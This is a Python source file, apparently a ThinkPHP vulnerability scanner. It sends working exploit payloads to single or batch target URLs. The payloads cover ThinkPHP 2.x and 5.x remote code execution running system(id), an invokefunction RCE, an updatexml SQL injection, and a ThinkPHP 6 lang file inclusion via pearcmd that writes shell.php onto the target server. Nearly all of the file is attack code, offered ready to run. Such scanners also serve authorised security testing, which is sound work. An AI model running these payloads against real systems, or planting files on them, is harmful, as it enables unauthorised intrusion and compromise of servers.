import datetime
import rich
import sys
import argparse
import requests
from urllib.parse import urljoin
from rich import print as rprint

class thinkphp_scan:
    def __init__(self,url):
        self.url = url


    def thinkphp2x_rce(self):
        result = {
            'name':'thinkphp2x rce',
            'vulnerable':False
        }

        try:
            payload = '/?s=/x/y/z/${system(id)}'
            url = urljoin(self.url,payload)
            response = requests.get(url=url,verify=False)
            if 'www-data' in response.text:
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['payload'] = payload
                result['url'] = url
                return result
            else:
                return result
        except:
            return result


    def thinkphp5_0_23(self):
        result = {
            'name':'thinkphp5.0.23 rce',
            'vulnerable':False
        }

        try:
            payload = {"_method":"__construct","filter[]":"system","method":"get","server[REQUEST_METHOD]":"id"}
            url = urljoin(self.url,'/index.php?s=captcha')
            response = requests.post(url=url,data=payload,verify=False)
            if 'www-data' in response.text:
                result['vulnerable'] = True
                result['method'] = 'POST'
                result['payload'] = payload
                result['url'] = url
                return result
            else:
                return result
        except:
            return result


    def thinkphp5x_rce(self):
        result = {
            'name':'thinkphp5-5.0.22/5.1.29 RCE',
            'vulnerable':False
        }

        try:
            payload = '/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
            url = urljoin(self.url,payload)
            response = requests.get(url=url,verify=False)
            if 'www-data' in response.text:
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['payload'] = payload
                result['url'] = url
                return result
            else:
                return result

        except:
            return result


    def thinkphp5_sqlinjction(self):
        result = {
            'name':'thinkphp5 sql injection and Sensitive information leakage',
            'vulnerable':False
        }

        try:
            payload = '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
            url = urljoin(self.url, payload)
            response = requests.get(url=url, verify=False)
            if 'XPATH syntax error' in response.text:
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['payload'] = payload
                result['url'] = url
                return result
            else:
                return result
        except:
            return result


    def thinkphp6_lang(self):
        result = {
            'name':'thinkphp6 lang local file inclusion',
            'vulnerable':False
        }

        try:
            payload = '/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php'
            url1 = urljoin(self.url, payload)
            response1 = requests.get(url=url1, verify=False)
            url2 = urljoin(self.url, '/shell.php')
            response2 = requests.get(url=url2, verify=False)
            if response2.status_code == 200:
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['payload'] = payload
                result['url'] = url2
                return result
            else:
                return result
        except:
            return result

# 获取时间
def get_time():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
# 美化输出
def info(date, body):
    rprint("[[bold green]" + date + "[/bold green]] [[bold blue]Info[/bold blue]] > " + body)

# 扫描开始
def start_scan(url):
    scan = thinkphp_scan(url).thinkphp2x_rce()
    info(get_time(),scan['name'] + str('  ' + str(scan['vulnerable'])))
    if scan['vulnerable'] == True:
        detial(scan)

    scan = thinkphp_scan(url).thinkphp5_0_23()
    info(get_time(),scan['name'] + str('  ' + str(scan['vulnerable'])))
    if scan['vulnerable'] == True:
        detial(scan)

    scan = thinkphp_scan(url).thinkphp5x_rce()
    info(get_time(),scan['name'] + str('  ' + str(scan['vulnerable'])))
    if scan['vulnerable'] == True:
        detial(scan)

    scan = thinkphp_scan(url).thinkphp5_sqlinjction()
    info(get_time(),scan['name'] + str('  ' + str(scan['vulnerable'])))
    if scan['vulnerable'] == True:
        detial(scan)

    scan = thinkphp_scan(url).thinkphp6_lang()
    info(get_time(),scan['name'] + str('  ' + str(scan['vulnerable'])))
    if scan['vulnerable'] == True:
        detial(scan)


# 详细输出
def detial(scan):
    rprint("[[bold blue]method[/bold blue]]:" + scan['method'])
    rprint("[[bold blue]payload[/bold blue]]:",scan['payload'])
    rprint("[[bold blue]url[/bold blue]]:",scan['url'])



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='thinkphp漏洞扫描器')
    parser.add_argument('-url','--url',type=str,help='请输入目标的url')
    parser.add_argument('-file','--file',type=str,help='请输入文件路径名')
    args = parser.parse_args()

    if '-url' in sys.argv:
        info(get_time(), 'thinkphp漏洞开始检测')
        start_scan(args.url)
        info(get_time(), 'thinkphp漏洞检测完毕')
    elif '-file' in sys.argv:
        file = open(args.file,'r')
        info(get_time(), 'thinkphp漏洞开始检测')
        for url in file:
            start_scan(url)
        info(get_time(), 'thinkphp漏洞检测完毕')






